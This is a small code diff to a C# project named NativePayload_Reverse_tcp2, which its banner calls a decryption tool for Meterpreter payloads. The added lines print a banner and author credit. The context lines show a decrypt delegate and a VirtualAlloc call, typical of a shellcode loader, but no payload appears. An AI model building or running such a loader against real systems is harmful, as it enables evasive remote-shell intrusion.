@@ -120,6 +120,13 @@ namespace NativePayload_Reverse_tcp2
         
         static void Main(string[] args)
         {
+ 	    Console.WriteLine();
+            Console.ForegroundColor = ConsoleColor.DarkGray;
+            Console.WriteLine("NativePayload_Reverse_tcp2 , Payload Decryption tool for Meterpreter Payloads (v2) ");
+            Console.ForegroundColor = ConsoleColor.Gray;
+            Console.WriteLine("Published by Damon Mohammadbagher , Dec 2016");
+            Console.ForegroundColor = ConsoleColor.DarkGreen;
+            Console.WriteLine();
 
             Hide.D de = Hide.Decrypt;
             V v = Hide.code.b._classs.VirtualAlloc;
